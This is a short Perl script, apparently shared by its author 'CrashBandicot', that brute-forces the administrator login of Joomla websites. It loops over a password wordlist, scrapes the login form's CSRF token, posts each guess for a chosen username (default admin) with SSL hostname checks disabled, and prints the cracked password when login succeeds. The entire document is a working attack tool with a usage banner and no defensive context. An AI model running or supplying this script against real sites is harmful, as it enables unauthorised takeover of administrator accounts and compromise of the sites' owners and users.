#!/usr/bin/perl
# by Crash
# user default is admin

use LWP::UserAgent;

&flag;

joombrute($ARGV[0],$ARGV[2],$ARGV[1]);

sub joombrute { 

open(password,"<$_[1]") or die "$!";
while(<password>){
chomp($password = $_);

$ua = LWP::UserAgent->new( agent => "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5", ssl_opts => { verify_hostname => 0 });
$ua->cookie_jar({});

$res = $ua->get($_[0]."/administrator/index.php")->content;
if($res =~ m/name="(.*)" value="1"/) {  

    $token = $1;

 $request = $ua->post($_[0]."/administrator/index.php", { 

 username => $_[2],
 passwd => $password,
 lang => "",
 option => "com_login",
 task => "login",
 return => "aW5kZXgucGhw",
 $token => 1, 

 });

$req = $ua->get($_[0]."/administrator/index.php")->content;

if($req =~/Logout/) { 

 print "\n\n\t  [+] URI : ".$_[0];
 print "\n\t  [+] Pass Cracked : '$password'\n\n";
 exit;

} else { 
print "\n   [!] Try Password '$password'";
 } } else { die("\n [-]Can't Grabb Joomla Token !"); } } }

sub flag {

system(($^O eq 'MSWin32') ? 'cls' : 'clear');


    print "\t\n\n       |==================|";
	print "\t\n       |Joomla Bruteforcer|";
	print "\t\n       | by CrashBandicot |";
	print "\t\n       |==================|\n\n";
	print "usage: $0 http://localhost/joomla/ admin pass.txt\n\n";


$usage = "\t\n usage: $0 http://localhost/joomla/ admin pass.txt\n\n";
 die "$usage" unless $ARGV[0] && $ARGV[1] && $ARGV[2];

}
